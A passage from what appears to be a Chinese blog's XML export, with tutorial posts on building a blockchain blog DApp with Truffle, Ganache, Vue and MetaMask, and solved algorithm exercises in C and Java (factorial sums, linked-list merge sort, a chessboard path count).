class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><strong>注意！我们这里使用<code>send</code>函数而不是<code>call</code>函数，因为后者没法更新状态</strong></p>
<h2 id="文章详情页面"><a href="#文章详情页面" class="headerlink" title="文章详情页面"></a>文章详情页面</h2><p>这里有一点要注意，如果该文章的作者与正在登录的一致，我们给予删除和修改的权限</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 只有文章所有者才有权删除和修改 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"is_owner"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"delete_btn"</span> <span class="attr">v-on:click</span>=<span class="string">"deleteClick"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"modify_btn"</span> <span class="attr">v-on:click</span>=<span class="string">"modifyClick"</span>&gt;</span>修改<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ....... --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// .......</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 检查该文章是不是当前 metamask 中活跃的账户所写的</span></span></span><br><span class="line">    checkOwner() &#123;</span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.ethereum</span></span><br><span class="line">        .enable()</span><br><span class="line"><span class="javascript">        .then(<span class="function">(<span class="params">accounts</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (accounts[<span class="number">0</span>].toLowerCase() == <span class="keyword">this</span>.blog.author.toLowerCase()) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.is_owner = <span class="literal">true</span>;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="javascript">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(e);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="修改文章页面"><a href="#修改文章页面" class="headerlink" title="修改文章页面"></a>修改文章页面</h2><p>这里和新增文章页面差不多，只不过要先请求旧的文章填充表单，然后再提示用户修改。</p>
<hr>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>==此项目仅用于学习，请勿用于其他违反道德和法律的事项！==</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【1】ChainBlog（本项目完整源码）.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
<p>【2】web3.js中文文档.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>【3】Solidity中文文档.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>【4】truffle文档.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>【5】开发、部署第一个DApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>【6】DApp教程：用Truffle 开发一个链上记事本.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>【7】Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>阶乘求和</title>
    <url>/2020/05/22/%E9%98%B6%E4%B9%98%E6%B1%82%E5%92%8C/</url>
    <content><![CDATA[<blockquote>
<p>题目来源：<a href="https://www.dotcpp.com/oj/problem1014.html" target="_blank" rel="noopener">C语言网1014</a></p>
</blockquote>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p> 求Sn=1!+2!+3!+4!+5!+…+n!之值，其中n是一个数字(n不超过20)。 </p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>

<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">153</span><br></pre></td></tr></table></figure>

<h2 id="问题求解"><a href="#问题求解" class="headerlink" title="问题求解"></a>问题求解</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-22 20:40:31</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-22 22:19:56</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\dotcpp\1014.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">factorial</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> factorial[<span class="number">100</span>];</span><br><span class="line">&#125; f;</span><br><span class="line">f num[<span class="number">25</span>];</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// 高精度存储</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setNum</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="number">1</span>) &#123;</span><br><span class="line">        num[<span class="number">1</span>].factorial[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">0</span>, mul = <span class="number">0</span>, i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>;; i++) &#123;</span><br><span class="line">            mul = (num[index - <span class="number">1</span>].factorial[i] * index + c) % MAX_NUM;</span><br><span class="line">            c = (num[index - <span class="number">1</span>].factorial[i] * index + c) / MAX_NUM;</span><br><span class="line">            num[index].factorial[i] = mul;</span><br><span class="line">            <span class="keyword">if</span> ((mul + c + num[index - <span class="number">1</span>].factorial[i + <span class="number">1</span>]) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addAns</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">0</span>, i, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>;; i++) &#123;</span><br><span class="line">        sum = (ans[i] + num[index].factorial[i] + c) % MAX_NUM;</span><br><span class="line">        c = (ans[i] + num[index].factorial[i] + c) / MAX_NUM;</span><br><span class="line">        ans[i] = sum;</span><br><span class="line">        <span class="keyword">if</span> ((sum + c + ans[i + <span class="number">1</span>]) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, i, len;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        setNum(i);</span><br><span class="line">        len = addAns(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = len - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="comment">// 首位前导零去掉</span></span><br><span class="line">        <span class="keyword">if</span> (ans[i] &lt; <span class="number">10</span> &amp;&amp; i != len - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"0%d"</span>, ans[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 个位数补零</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>阶乘</tag>
        <tag>高精度</tag>
      </tags>
  </entry>
  <entry>
    <title>非递归方式进行归并排序链表</title>
    <url>/2020/08/24/%E9%9D%9E%E9%80%92%E5%BD%92%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<blockquote>
<p>题目来源：<a href="https://leetcode-cn.com/problems/sort-list/" target="_blank" rel="noopener">LeetCode 148</a></p>
</blockquote>
<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p>给你一个链表， 在 <code>O(n log n)</code>时间复杂度和常数级空间复杂度下，对链表进行排序。 </p>
<p>啥？把链表排序，把时间复杂度控制在<code>O(nlogn)</code>？，链表不像数组，排序没有那么方便啊！归并排序，常数级空间复杂度？那只能非递归实现了~~</p>
<p>不过我不知道该怎么写，看了评论区，自己整理了一下。<a id="more"></a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode <span class="title">mergetSort</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    <span class="keyword">int</span> listLength = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (ListNode l = head; l != <span class="keyword">null</span>; l = l.next) listLength++;</span><br><span class="line">    ListNode helperRoot = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    helperRoot.next = head;</span><br><span class="line">    ListNode helper = helperRoot;</span><br><span class="line">    <span class="comment">// 步长， 即每个子区间的长度</span></span><br><span class="line">    <span class="keyword">int</span> step = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (step &lt; listLength) &#123;</span><br><span class="line">        helper = helperRoot;</span><br><span class="line">        <span class="keyword">for</span> (ListNode start = helperRoot.next; start != <span class="keyword">null</span>; ) &#123;</span><br><span class="line">            ListNode end = start, mid = start, pre = start;</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (len &lt; step &amp;&amp; mid != <span class="keyword">null</span>) &#123;</span><br><span class="line">                len++;</span><br><span class="line">                pre = mid;</span><br><span class="line">                mid = mid.next;</span><br><span class="line">            &#125;</span><br><span class="line">            pre.next = <span class="keyword">null</span>;</span><br><span class="line">            end = mid;</span><br><span class="line">            pre = mid;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (len &lt; step &amp;&amp; end != <span class="keyword">null</span>) &#123;</span><br><span class="line">                len++;</span><br><span class="line">                pre = end;</span><br><span class="line">                end = end.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pre != <span class="keyword">null</span>) pre.next = <span class="keyword">null</span>;</span><br><span class="line">            ListNode nextStart = end;</span><br><span class="line">            ListNode[] merger = merger(start, mid);</span><br><span class="line">            helper.next = merger[<span class="number">0</span>];</span><br><span class="line">            merger[<span class="number">1</span>].next = nextStart;</span><br><span class="line">            start = nextStart;</span><br><span class="line">            helper = merger[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        step *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> helperRoot.next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回合并后的链表头指针和尾指针</span></span><br><span class="line">ListNode[] merger(ListNode left, ListNode rightStart) &#123;</span><br><span class="line">    ListNode leftStart = left;</span><br><span class="line">    ListNode listTail = left;</span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span> &amp;&amp; rightStart == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 其实在本题中， 左边链表不会是null</span></span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        listTail = rightStart;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;rightStart, listTail&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (rightStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;left, listTail&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode root = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    ListNode tail = root;</span><br><span class="line">    <span class="keyword">while</span> (rightStart != <span class="keyword">null</span> &amp;&amp; leftStart != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (leftStart.val &lt; rightStart.val) &#123;</span><br><span class="line">            tail.next = leftStart;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            leftStart = leftStart.next;</span><br><span class="line">            tail.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tail.next = rightStart;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            rightStart = rightStart.next;</span><br><span class="line">            tail.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        tail.next = rightStart;</span><br><span class="line">        listTail = tail;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tail.next = leftStart;</span><br><span class="line">        listTail = tail;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;root.next, listTail&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>归并排序</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>马拦过河卒</title>
    <url>/2020/05/24/%E9%A9%AC%E5%85%B0%E8%BF%87%E6%B2%B3%E5%8D%92/</url>
    <content><![CDATA[<blockquote>
<p>题目来源：<a href="https://www.dotcpp.com/oj/problem1266.html" target="_blank" rel="noopener">C语言网1266</a></p>
</blockquote>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p> 棋盘上A点有一个过河卒，需要走到目标B点。卒行走的规则：可以向下、或者向右。同时在棋盘上C点有一个对方的马，该马所在的点和所有跳跃一步可达的点称为对方马的控制点。因此称之为“马拦过河卒”。<br>棋盘用坐标表示，A点(0, 0)、B点(n, m)(n, m为不超过15的整数)，同样马的位置坐标是需要给出的。现在要求你计算出卒从A点能够到达B点的路径的条数，假设马的位置是固定不动的，并不是卒走一步马走一步。 <a id="more"></a></p>
<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p> 一行四个数据，分别表示B点坐标和马的坐标。（保证所有的数据有解） </p>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p> 一个数据，表示所有的路径条数。 </p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6 6 3 5</span><br></pre></td></tr></table></figure>

<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<h2 id="问题求解"><a href="#问题求解" class="headerlink" title="问题求解"></a>问题求解</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-24 13:34:01</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-24 14:16:01</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\dotcpp\1266.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @x : 马的横坐标  @y : 马的纵坐标</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> path[<span class="number">16</span>][<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;, sum = <span class="number">0</span>, n, m, x, y;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化禁区</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setHorse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    path[x][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">2</span>) &gt;= <span class="number">0</span> &amp;&amp; (y - <span class="number">1</span>) &gt;= <span class="number">0</span>) path[x - <span class="number">2</span>][y - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; (y - <span class="number">2</span>) &gt;= <span class="number">0</span>) path[x - <span class="number">1</span>][y - <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">2</span>) &gt;= <span class="number">0</span> &amp;&amp; (y + <span class="number">1</span>) &lt;= m) path[x - <span class="number">2</span>][y + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; (y + <span class="number">2</span>) &lt;= m) path[x - <span class="number">1</span>][y + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">2</span>) &lt;= n &amp;&amp; (y - <span class="number">1</span>) &gt;= <span class="number">0</span>) path[x + <span class="number">2</span>][y - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">1</span>) &lt;= n &amp;&amp; (y - <span class="number">2</span>) &gt;= <span class="number">0</span>) path[x + <span class="number">1</span>][y - <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">2</span>) &lt;= n &amp;&amp; (y + <span class="number">1</span>) &lt;= m) path[x + <span class="number">2</span>][y + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">1</span>) &lt;= n &amp;&amp; (y + <span class="number">2</span>) &lt;= m) path[x + <span class="number">1</span>][y + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findPath</span><span class="params">(<span class="keyword">int</span> nowX, <span class="keyword">int</span> nowY)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nowX == n &amp;&amp; nowY == m) &#123;</span><br><span class="line">        sum++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 先往右</span></span><br><span class="line">    <span class="keyword">if</span> ((nowY + <span class="number">1</span>) &lt;= m &amp;&amp; !path[nowX][nowY + <span class="number">1</span>]) findPath(nowX, nowY + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 再往下</span></span><br><span class="line">    <span class="keyword">if</span> ((nowX + <span class="number">1</span>) &lt;= n &amp;&amp; !path[nowX + <span class="number">1</span>][nowY]) findPath(nowX + <span class="number">1</span>, nowY);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d"</span>, &amp;n, &amp;m, &amp;x, &amp;y);</span><br><span class="line">    setHorse();</span><br><span class="line">    <span class="comment">// 先往右</span></span><br><span class="line">    <span class="keyword">if</span> (!path[<span class="number">0</span>][<span class="number">1</span>]) findPath(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 再往下</span></span><br><span class="line">    <span class="keyword">if</span> (!path[<span class="number">1</span>][<span class="number">0</span>]) findPath(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>递归</tag>
        <tag>深度优先</tag>
      </tags>
  </entry>
  <entry>
    <title>链博--DAPP练手项目（二）</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>原文再续，书接上回。</p>
<p>这一回我们主要做前置部署工作。<a id="more"></a></p>
<h2 id="Ganache配置"><a href="#Ganache配置" class="headerlink" title="Ganache配置"></a>Ganache配置</h2><p>首先打开<code>Ganache</code>，然后新建一个工程<code>chain_blog_network</code>，如下图所示，这表明我们在本地创建好了一个测试链（当然如果你有一些测试以太币，你可以部署到相应的测试链中）。在这个测试链中，有若干个账户，每个账户都有100个以太币，点击每个账户的钥匙图标就可以获取其私钥。</p>
<p><img src="https://cdn.yalexin.top/ganache_01.png" alt></p>
<h2 id="编写部署脚本"><a href="#编写部署脚本" class="headerlink" title="编写部署脚本"></a>编写部署脚本</h2><p>编写测试脚本之前，请再次确保配置文件<code>truffle-config.js</code>已经设置好:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">     host: <span class="string">"127.0.0.1"</span>,     <span class="comment">// Localhost (default: none)</span></span><br><span class="line">     port: <span class="number">7545</span>,            <span class="comment">// Standard Ethereum port (default: none)</span></span><br><span class="line">     network_id: <span class="string">"*"</span>,       <span class="comment">// Any network (default: none)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着在<code>migrations</code>文件夹下新建一个部署脚本<code>1_deploy.js</code>，请注意，文件名以数字为前缀，后缀为描述。 编号前缀是必需的，以便记录迁移是否成功运行。 后缀纯粹是为了人类的可读性和理解力，在该文件中写入如下文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ChainBlog = artifacts.require(<span class="string">"ChainBlog"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(ChainBlog);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后在项目根目录下执行部署命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> truffle migrate</span></span><br></pre></td></tr></table></figure>

<p>当出现相关信息后，则说明部署成功了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Summary</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&gt; Total deployments:   1</span><br><span class="line">&gt; Final cost:          0.03190554 ETH</span><br></pre></td></tr></table></figure>

<h2 id="初始化Vue项目"><a href="#初始化Vue项目" class="headerlink" title="初始化Vue项目"></a>初始化Vue项目</h2><h3 id="Vue-安装"><a href="#Vue-安装" class="headerlink" title="Vue 安装"></a>Vue 安装</h3><p>使用命令行安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g @vue/cli</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vue -V</span></span><br><span class="line">@vue/cli 5.0.8</span><br></pre></td></tr></table></figure>

<h3 id="创建Vue项目"><a href="#创建Vue项目" class="headerlink" title="创建Vue项目"></a>创建Vue项目</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vue create chain_blog</span></span><br></pre></td></tr></table></figure>

<p>然后选择<code>vue2</code>版本，然后将一些“插件”装上即可，例如<code>Babel</code>、<code>Router</code>、<code>CSS Pre-processors</code>。</p>
<p>创建完毕后，记得在项目中安装<code>web3</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install web3 --save</span></span><br></pre></td></tr></table></figure>

<h3 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h3><p>为了方便<code>Vue</code>项目能够读取到合约的<code>abi</code>相关信息，我们要对之前生成的<code>truffle</code>项目做出简单修改。</p>
<p>将之前文件夹<code>chainBlogContracts</code>下所有的文件都复制到当前文件夹<code>chain_blog</code>下，并在<code>truffle-config.js</code>中设置构建路径，使得我们的<code>vue</code>应用能够获取智能合约相关的<code>ABI</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">  <span class="string">"contracts_build_directory"</span>: <span class="string">"./src/build"</span></span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后重新运行部署命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> truffle migrate</span></span><br></pre></td></tr></table></figure>

<p>如果不出意外，那我们将会在<code>vue</code>项目下的<code>src</code>文件夹下<code>build</code>目录中看到我们的智能合约<code>json</code>文件.</p>
<h2 id="MetaMask-安装"><a href="#MetaMask-安装" class="headerlink" title="MetaMask 安装"></a>MetaMask 安装</h2><p>我们的项目是基于智能合约，在智能合约中，每次和它们交互，需要一个账户。</p>
<p>交互过程中，我们完全可以直接手动创建交易，然后使用私钥进行签名，然后广播我们的交易，从而完成我们与智能合约交互。</p>
<p>然后如此一来，当我们有多个账户时候，切换账号以及账号的保管是一个麻烦的事情，因此我们可以借助<code>MetaMask</code>工具，将我们的账户交给其掌管，而且不用担心账户会被第三方机构窃取，因为最终我们的账户信息是保存在本地的。</p>
<p>可以到<code>chrome</code>浏览器或者<code>Edge</code>浏览器的扩展商店下载。</p>
<p>安装完以后，先添加一个网络，将我们的本地测试网络添加到<code>MetaMask</code></p>
<p><img src="https://cdn.yalexin.top/image-20230102101940590.png" alt="image-20230102101940590"></p>
<p>然后再回到<code>Ganache</code>中，复制几个账户的私钥，导入到<code>MetaMask</code>中，然后我们就可以看到我们的每个账户都有100个以太币了</p>
<hr>
<p>下一篇文章我们将使用<code>Vue</code>，借助智能合约的<code>json</code>文件与本地测试链中的智能合约交互。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【1】ChainBlog（本项目完整源码）.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
